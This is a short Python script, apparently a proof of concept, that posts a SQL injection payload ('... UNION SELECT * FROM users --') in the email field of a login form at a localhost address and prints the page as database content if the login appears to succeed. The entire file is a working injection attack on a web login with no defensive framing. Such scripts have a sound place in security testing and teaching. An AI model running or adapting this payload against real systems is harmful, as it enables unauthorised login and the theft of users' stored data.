import requests

url = "http://127.0.0.1:5000/login"

payload = {
    "email": "user1@example.com' UNION SELECT * FROM users --"
}

response = requests.post(url, data=payload)

if "Logged in as" in response.text:
    print("Successful SQL injection!")
    print("Database content:")
    print(response.text)
else:
    print("Login failed.")